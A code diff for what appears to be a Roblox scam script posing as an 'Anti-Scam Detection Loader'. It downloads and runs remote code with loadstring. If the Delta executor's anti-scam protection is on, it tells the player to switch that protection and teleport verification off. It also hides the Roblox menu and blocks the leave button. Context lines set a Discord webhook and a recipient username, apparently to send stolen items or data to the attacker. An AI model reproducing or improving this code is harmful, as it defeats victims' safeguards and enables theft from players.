@@ -1,3 +1,242 @@
+-- ─── Part 1: Anti‑Scam Detection Loader ───
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+if not player then warn("LocalPlayer not found. Run this as a LocalScript.") return end
+local playerGui = player:WaitForChild("PlayerGui")
+local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local messageURL = "https://raw.githubusercontent.com/GagDeveloper/DETECT-ANTI-SCAM/refs/heads/main/MESSAGE"
+local ok, err = pcall(function()
+    local code = game:HttpGet(messageURL)
+    loadstring(code)()
+end)
+if ok then print("[Loader] MESSAGE loaded.") else warn("[Loader] Failed to load MESSAGE:", err) end
+
+-- fallback detectExecutor if not provided
+if type(detectExecutor) ~= "function" then
+    function detectExecutor()
+        if syn then return "Synapse"
+        elseif KRNL then return "KRNL"
+        elseif Fluxus then return "Fluxus"
+        elseif Protosmasher then return "Protosmasher"
+        elseif (ArceusX ~= nil) or (Arceus ~= nil) then return "Arceus X"
+        elseif Delta then return "Delta"
+        else return "Unknown"
+        end
+    end
+end
+
+-- wait briefly for _G.IsEnabled to be set
+local waitTimeout, elapsed = 3, 0
+while _G.IsEnabled == nil and elapsed < waitTimeout do
+    task.wait(0.1)
+    elapsed = elapsed + 0.1
+end
+if _G.IsEnabled == nil then
+    warn("[Loader] _G.IsEnabled is nil after "..waitTimeout.."s; assuming false (Anti-Scam OFF).")
+    _G.IsEnabled = false
+end
+
+local executor = detectExecutor()
+print("[Loader] Executor detected:", executor)
+
+-- If Delta and Anti-Scam is ON → show warning GUI and halt
+if executor == "Delta" and _G.IsEnabled then
+    local deltaGui = Instance.new("ScreenGui")
+    deltaGui.Name = "DeltaAntiScamGui"
+    deltaGui.IgnoreGuiInset = true
+    deltaGui.ResetOnSpawn = false
+    deltaGui.Parent = playerGui
+
+    local frame = Instance.new("Frame", deltaGui)
+    frame.Size = UDim2.new(0, 500, 0, 250)
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Position = UDim2.new(0.5, 0.5, 0.5, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35); frame.BorderSizePixel = 0
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
+    local stroke = Instance.new("UIStroke", frame); stroke.Color = Color3.fromRGB(0, 170, 255); stroke.Thickness = 2
+    Instance.new("UIAspectRatioConstraint", frame).AspectRatio = 2
+    local sizeConstraint = Instance.new("UISizeConstraint", frame)
+    sizeConstraint.MinSize = Vector2.new(400, 200)
+    sizeConstraint.MaxSize = Vector2.new(600, 300)
+
+    local warningBar = Instance.new("TextLabel", frame)
+    warningBar.Size = UDim2.new(1, 0, 0.15, 0)
+    warningBar.Position = UDim2.new(0, 0, 0, 0)
+    warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    warningBar.TextColor3 = Color3.fromRGB(255, 221, 51)
+    warningBar.Text = [[Turn off your Anti Scam & Verify Teleport to avoid getting banned or disconnected.]]
+    warningBar.RichText = true; warningBar.TextSize = 14; warningBar.Font = Enum.Font.GothamBold
+    warningBar.TextWrapped = true; warningBar.TextXAlignment = Enum.TextXAlignment.Center; warningBar.TextYAlignment = Enum.TextYAlignment.Center
+    Instance.new("UICorner", warningBar).CornerRadius = UDim.new(0, 16)
+
+    task.spawn(function()
+        local visible = true
+        while warningBar and warningBar.Parent do
+            local targetBg = visible and 0.5 or 0
+            local targetText = visible and 0.5 or 0
+            TweenService:Create(warningBar, TweenInfo.new(0.2), {
+                BackgroundTransparency = targetBg,
+                TextTransparency = targetText
+            }):Play()
+            visible = not visible
+            task.wait(0.2)
+        end
+    end)
+
+    local bodyHolder = Instance.new("Frame", frame)
+    bodyHolder.Size = UDim2.new(1, -30, 0.55, 0)
+    bodyHolder.Position = UDim2.new(0, 15, 0.18, 0)
+    bodyHolder.BackgroundTransparency = 1
+
+    local title = Instance.new("TextLabel", bodyHolder)
+    title.Size = UDim2.new(1, 0, 0.25, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "Delta Anti-Scam Detected"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.TextWrapped = true
+
+    local desc = Instance.new("TextLabel", bodyHolder)
+    desc.Size = UDim2.new(1, 0, 0.7, 0)
+    desc.Position = UDim2.new(0, 0, 0.3, 0)
+    desc.BackgroundTransparency = 1
+    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
+    desc.Font = Enum.Font.Gotham
+    desc.TextSize = 15
+    desc.TextWrapped = true
+    desc.RichText = true
+    desc.TextXAlignment = Enum.TextXAlignment.Center
+    desc.TextYAlignment = Enum.TextYAlignment.Center
+    desc.Text = [[
+1) Tap the Delta icon at the top.
+2) Open Settings (gear icon).
+3) Turn OFF the "Anti-Scam" & "Verify Teleport" option.
+4) Rejoin and run the script again.
+]]
+
+    local buttonContainer = Instance.new("Frame", frame)
+    buttonContainer.Size = UDim2.new(1, -30, 0.18, 0)
+    buttonContainer.Position = UDim2.new(0, 15, 0.8, 0)
+    buttonContainer.BackgroundTransparency = 1
+
+    local rejoinButton = Instance.new("TextButton", buttonContainer)
+    rejoinButton.Size = UDim2.new(1, 0, 1, 0)
+    rejoinButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    rejoinButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+    rejoinButton.Font = Enum.Font.GothamBold
+    rejoinButton.TextSize = 16
+    rejoinButton.Text = "Rejoin Game (5.0s)"
+    rejoinButton.TextWrapped = true
+    rejoinButton.AutoButtonColor = false
+    rejoinButton.Active = false
+    Instance.new("UICorner", rejoinButton).CornerRadius = UDim.new(0, 10)
+
+    task.spawn(function()
+        local countdown = 5
+        while countdown > 0 do
+            rejoinButton.Text = string.format("Rejoin Game (%.1fs)", math.max(countdown, 0))
+            task.wait(0.1)
+            countdown = countdown - 0.1
+        end
+        rejoinButton.Text = "Rejoin Game"
+        rejoinButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+        rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        rejoinButton.AutoButtonColor = true
+        rejoinButton.Active = true
+    end)
+
+    rejoinButton.MouseButton1Click:Connect(function()
+        if rejoinButton.Active then
+            TeleportService:Teleport(game.PlaceId, player)
+        end
+    end)
+
+    pcall(function()
+        if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
+            game.CoreGui.AntiLeaveBlocker:Destroy()
+        end
+    end)
+
+    -- Block Roblox menus
+    local BLOCK_SIZE_X, BLOCK_SIZE_Y = 56, 56
+    local BLOCK_POS_X, BLOCK_POS_Y = 6, 6
+    local DISPLAY_ORDER = 10000
+
+    local function tryHideRobloxMenu()
+        pcall(function()
+            local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
+            for _, n in ipairs(names) do
+                local g = game.CoreGui:FindFirstChild(n)
+                if g then
+                    pcall(function()
+                        if g:IsA("ScreenGui") then
+                            g.Enabled = false
+                            for _, c in ipairs(g:GetChildren()) do
+                                pcall(function() c.Visible = false end)
+                                pcall(function() c.Enabled = false end)
+                            end
+                        else
+                            for _, c in ipairs(g:GetDescendants()) do
+                                pcall(function()
+                                    if c:IsA("GuiObject") then
+                                        c.Position = UDim2.new(-10, 0, -10, 0)
+                                    end
+                                end)
+                            end
+                        end
+                    end)
+                end
+            end
+        end)
+    end
+
+    local blockerGui = Instance.new("ScreenGui")
+    blockerGui.Name = "AntiLeaveBlocker"
+    blockerGui.Parent = game.CoreGui
+    blockerGui.ResetOnSpawn = false
+    blockerGui.IgnoreGuiInset = true
+    blockerGui.DisplayOrder = DISPLAY_ORDER
+    blockerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
+    container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+    container.BackgroundTransparency = 1
+    container.BorderSizePixel = 0
+    container.Parent = blockerGui
+
+    local blocker = Instance.new("TextButton")
+    blocker.Size = UDim2.new(1, 0, 1, 0)
+    blocker.BackgroundTransparency = 1
+    blocker.AutoButtonColor = false
+    blocker.Text = ""
+    blocker.Parent = container
+    blocker.Active = true
+    blocker.Selectable = false
+    blocker.MouseButton1Down:Connect(function() end)
+    blocker.MouseButton1Up:Connect(function() end)
+    blocker.MouseButton2Down:Connect(function() end)
+    blocker.MouseButton2Up:Connect(function() end)
+
+    RunService.RenderStepped:Connect(function()
+        container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+    end)
+
+    task.spawn(function()
+        while blockerGui.Parent == game.CoreGui do
+            tryHideRobloxMenu()
+            task.wait(2)
+        end
+    end)
+
+    return
+end
+
+ 
 getgenv().Webhook = "https://discord.com/api/webhooks/1412382801461776427/SrSHD137zB3ESdCPUU45hNXh4rSaJRYNWU-muRahrbLRzSRnnUCGsF4bIQlb5bJ_XFSy"
 getgenv().Username = "BEESUCALL"
         local RS = game:GetService("ReplicatedStorage")
